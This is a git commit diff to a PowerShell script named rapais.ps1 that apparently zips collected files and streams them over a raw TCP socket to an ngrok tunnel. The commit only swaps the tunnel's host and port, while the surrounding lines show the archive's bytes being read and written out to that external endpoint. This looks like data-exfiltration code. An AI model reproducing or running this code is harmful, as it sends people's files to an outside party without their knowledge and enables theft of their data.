df7d60ae36dd7cd4fd853c8c03e2588652a09fa6
FBiUwU <71545021+FBIgLoK@users.noreply.github.com>
2026-03-06 19:22:37 +0100

    Update rapais.ps1

--- rapais.ps1
+++ rapais.ps1
@@ -22,7 +22,7 @@ Compress-Archive `
 Remove-Item $tempFile -Force
 
 # Envia via TCP
-$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 13167 )
+$c = New-Object Net.Sockets.TCPClient("5.tcp.eu.ngrok.io", 18305 )
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
